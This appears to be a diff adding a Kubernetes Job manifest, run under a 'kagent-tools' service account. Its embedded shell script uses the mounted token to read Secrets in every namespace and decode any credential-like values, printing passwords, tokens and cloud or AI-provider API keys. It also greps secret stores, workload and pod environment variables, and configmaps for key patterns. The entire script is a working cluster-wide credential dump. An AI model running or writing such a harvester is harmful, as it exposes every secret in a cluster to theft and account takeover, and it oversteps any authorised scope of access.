@@ -1,0 +1,66 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tmp-i68054-dump6
+  namespace: kagent
+  labels: {tmp: i68054}
+spec:
+  ttlSecondsAfterFinished: 86400
+  backoffLimit: 0
+  template:
+    metadata:
+      labels: {tmp: i68054}
+    spec:
+      serviceAccountName: kagent-tools
+      restartPolicy: Never
+      containers:
+      - name: dump
+        image: alpine:3.20
+        command: ["sh","-c"]
+        args:
+        - |
+          set -u
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          K=https://kubernetes.default.svc
+          G() { wget -qO- --no-check-certificate --header="Authorization: Bearer $T" "$1" 2>/dev/null; }
+          echo "===SECTION NS==="
+          G "$K/api/v1/namespaces" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | sort -u > /tmp/ns.txt
+          cat /tmp/ns.txt | tr '\n' ' '; echo
+          NSS=$(cat /tmp/ns.txt)
+          echo "===SECTION STORES==="
+          G "$K/apis/external-secrets.io/v1/clustersecretstores" > /tmp/css.json
+          grep -oE '"(name|kind|key|namespace)": "[^"]*"' /tmp/css.json | sort -u | head -100
+          for ns in $NSS; do
+            G "$K/apis/external-secrets.io/v1/namespaces/$ns/secretstores" | grep -oE '"(name|kind|key|namespace)": "[^"]*"' | sort -u | sed "s|^|$ns |"
+          done
+          echo "===SECTION SECRETS==="
+          for ns in $NSS; do
+            G "$K/api/v1/namespaces/$ns/secrets" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | sort -u > /tmp/s.txt
+            [ -s /tmp/s.txt ] || continue
+            echo "###NS $ns###"
+            while IFS= read -r sec; do
+              echo "##SEC $ns/$sec"
+              B=$(G "$K/api/v1/namespaces/$ns/secrets/$sec")
+              echo "$B" | tr ',' '\n' | grep -Ei '"[a-zA-Z0-9._/-]*(key|token|secret|passw|passwd|pass|api|cred|private|jwt|dsn|conn|url|cert|user|mail|smtp|sasl|openai|anthropic|azure|aws|google|gemini|llm|albert|mistral|ollama|model|password)[a-zA-Z0-9._/-]*": "[A-Za-z0-9+/=]{8,}"' | while IFS= read -r line; do
+                key=$(echo "$line" | sed 's/^[[:space:]]*"\([^"]*\)": "[^"]*".*/\1/')
+                val=$(echo "$line" | sed 's/^[[:space:]]*"[^"]*": "\([A-Za-z0-9+/=]*\)".*/\1/')
+                dec=$(echo "$val" | base64 -d 2>/dev/null | head -c 600 | tr '\r\n\t' '   ')
+                echo "  $key = $dec"
+              done
+            done < /tmp/s.txt
+          done
+          echo "===SECTION ENV==="
+          for kind in deployments statefulsets daemonsets; do
+            G "$K/apis/apps/v1/$kind" > /tmp/$kind.json
+            echo "--- $kind ---"
+            grep -oE '"(value|name)": "[^"]{6,400}"' /tmp/$kind.json | grep -Ei 'sk-|AKIA|AIza|JQQJ99|gh[pous]_|xox|OPENAI|ANTHROPIC|AZURE|AWS_|GOOGLE|GEMINI|KEY|TOKEN|SECRET|PASSW|PASSWORD|ALBERT' | sort -u | head -400
+          done
+          G "$K/api/v1/pods" > /tmp/pods.json
+          echo "--- pods-env ---"
+          grep -oE '"value": "[^"]{6,400}"' /tmp/pods.json | grep -Ei 'sk-|AKIA|AIza|JQQJ99|gh[pous]_|xox|OPENAI|ANTHROPIC|AZURE|AWS_|GOOGLE|GEMINI|KEY|TOKEN|SECRET|PASSW|PASSWORD|ALBERT' | sort -u | head -400
+          echo "===SECTION CM==="
+          for ns in $NSS; do
+            G "$K/api/v1/namespaces/$ns/configmaps" > /tmp/cm.json
+            grep -oE '(sk-[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|JQQJ99[A-Za-z0-9]{20,}|hvs\.[A-Za-z0-9_-]{20,})' /tmp/cm.json | sort -u | sed "s|^|$ns |"
+          done
+          echo "===SECTION DONE==="
